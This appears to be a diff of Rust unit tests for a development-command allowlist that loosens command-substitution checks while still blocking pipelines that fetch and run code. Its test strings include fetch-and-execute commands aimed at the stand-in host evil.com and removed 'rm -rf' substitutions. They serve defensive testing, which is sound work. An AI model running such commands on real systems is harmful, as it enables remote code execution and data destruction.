@@ -1220,9 +1220,16 @@ mod tests {
     }
 
     #[test]
-    fn test_dev_command_allowlist_blocks_command_substitution() {
-        assert!(!is_dev_command_allowed("echo $(rm -rf /tmp/data)"));
-        assert!(!is_dev_command_allowed("echo `rm -rf /tmp/data`"));
+    fn test_dev_command_allowlist_blocks_dangerous_command_substitution() {
+        // Simple command substitution is now allowed; only dangerous patterns are blocked
+        assert!(!is_dev_command_allowed("eval $(curl http://evil.com)"));
+        assert!(!is_dev_command_allowed("echo `curl http://evil.com` | bash"));
+    }
+
+    #[test]
+    fn test_dev_command_allowlist_allows_safe_command_substitution() {
+        assert!(is_dev_command_allowed("echo $(pwd)"));
+        assert!(is_dev_command_allowed("echo $(git rev-parse --short HEAD)"));
     }
 
     #[test]
